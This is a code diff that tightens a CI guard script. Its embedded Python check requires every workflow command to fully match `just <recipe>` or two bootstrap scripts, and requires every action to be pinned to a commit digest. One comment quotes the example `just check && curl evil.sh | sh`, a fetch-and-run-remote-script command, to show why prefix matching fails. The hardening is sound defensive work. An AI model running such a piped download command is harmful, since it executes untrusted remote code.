@@ -31,15 +31,31 @@ gate() {
 # Parsed rather than grepped. A GitLab job puts its commands in a list *under*
 # `script:`, so a line-oriented check would only ever see the `script:` key and
 # would pass while the commands beneath it did anything at all.
+#
+# It also reads `uses:`, because ci.yml's own header claims "No third-party
+# actions" and nothing asserted it. The claim now has a gate, and so does the
+# digest pinning: a tag ref is what a marketplace action's argument is actually
+# about, and an unpinned ref is the same mutable-tag exposure whoever publishes
+# it.
 workflows_carry_no_logic() {
     "$PY" - "$REPO" <<'PY'
-import sys, pathlib, yaml
+import sys, re, pathlib, yaml
 
 repo = pathlib.Path(sys.argv[1])
 # `just <recipe>`, plus the two bootstrap scripts that must run before `just`
 # exists on a fresh runner: os-deps.sh brings curl and unzip, install-tools.sh
 # brings just itself.
-ok = ("just ", "./scripts/os-deps.sh", "./scripts/install-tools.sh")
+#
+# The whole command, not its prefix. A prefix test passes
+# `just check && curl evil.sh | sh`, which is logic in a workflow by any reading
+# -- the same weakness this repo already records in settings.json's deny
+# matcher, which is a prefix and not a pattern. Anchoring both ends rejects
+# every chaining form at once instead of blocklisting operators one at a time.
+ok = re.compile(r"just [a-z][a-z-]*|\./scripts/(os-deps|install-tools)\.sh")
+# First-party owner and a 40-hex commit, which is what a digest pin looks like
+# for an action. `actions/checkout@v7` is a mutable tag: the ref moves, the
+# runner runs whatever it moved to.
+uses_ok = re.compile(r"actions/[a-z-]+@[0-9a-f]{40}")
 bad = []
 
 def commands(node):
@@ -59,16 +75,37 @@ def commands(node):
         for item in node:
             yield from commands(item)
 
-files = list((repo / ".github" / "workflows").glob("*.yml"))
+
+def uses(node):
+    """Every action a workflow runs."""
+    if isinstance(node, dict):
+        for key, value in node.items():
+            if key == "uses" and isinstance(value, str):
+                yield value
+            else:
+                yield from uses(value)
+    elif isinstance(node, list):
+        for item in node:
+            yield from uses(item)
+
+
+# Both extensions: GitHub reads either, so a check that reads only one fails
+# open on a file it was written to cover.
+workflows = repo / ".github" / "workflows"
+files = sorted(workflows.glob("*.yml")) + sorted(workflows.glob("*.yaml"))
 gitlab = repo / ".gitlab-ci.yml"
 if gitlab.is_file():
     files.append(gitlab)
 
 for path in files:
-    for command in commands(yaml.safe_load(path.read_text())):
+    document = yaml.safe_load(path.read_text())
+    for command in commands(document):
         command = command.strip()
-        if command and not command.startswith(ok):
+        if command and not ok.fullmatch(command):
             bad.append(f"{path.name}: {command}")
+    for action in uses(document):
+        if not uses_ok.fullmatch(action.strip()):
+            bad.append(f"{path.name}: uses {action.strip()}")
 
 if bad:
     print("\n".join(f"        {b}" for b in bad), file=sys.stderr)
